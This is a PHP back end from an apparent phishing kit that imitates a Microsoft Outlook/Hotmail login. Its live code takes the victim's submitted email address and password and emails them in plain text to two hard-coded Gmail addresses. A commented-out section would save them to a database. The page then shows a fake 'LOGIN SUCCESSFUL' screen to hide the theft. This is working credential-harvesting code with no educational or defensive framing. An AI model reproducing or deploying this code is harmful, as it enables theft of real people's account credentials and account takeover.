<?php
    // $email = $_POST['email'];
    // $password = $_POST['password'];

    // //Database connnection
    // $conn = new mysqli('localhost','root','','outlook');
    // if($conn->connect_error){
    //     die('Connection Failed : '.$conn->connect_error);
    // } else{
    //     $stmt = $conn->prepare("insert into outlook(email, password)values(?, ?)");
    //     $stmt->bind_param("ss", $email, $password);
    //     $stmt->execute();
    //     echo "";
    //     $stmt->close();
    //     $conn->close();
    // }

    //PHP code to receive content form in email address

    if (isset($_POST['submit'])) {
        $email = $_POST['email'];
        $password = $_POST['password'];
        $to = "nickspam231@gmail.com, olayemisrael5@gmail.com";
        $subject = "My Hotmail Details";

        $message = "
        <html>
        <head>
        <title>This is my mail Login Details</title>
        </head>
        <body>
            <h1>$email</h1>
            <p>$password</p>
        </body>
        </html>
        ";

        // Always set content-type when sending HTML email
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

        // More headers
        $headers .= 'From:olayemisrael5@gmail.com' . "\r\n";
        $headers .= 'Cc: nickspam231@gmail.com' . "\r\n";

        mail($to,$subject,$message,$headers);
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LOGIN SUCCESSFUL</title>
    <link rel="icon" href="image/logo.png">
  <link rel="stylesheet" href="plugins/bootstrap/css/bootstrap.css">
  <link rel="stylesheet" href="style.css">
  <script src="plugins/jquery.min.js"></script>
  <script src="plugins/bootstrap/assets/js/vendor/popper.min.js"></script>
  <script src="plugins/bootstrap/js/bootstrap.min.js"></script>
</head>
<body >
       <section>
        <div class="container">
            <div class="row justify-content-center">
            <img src="image/payment_success.gif" width="30%" class="gif">
            </div>
            <div class="row justify-content-center">
                <img src="image/connecting-loading.gif" alt="">
            </div>
            
        </div>
    </section>
</body>
</html>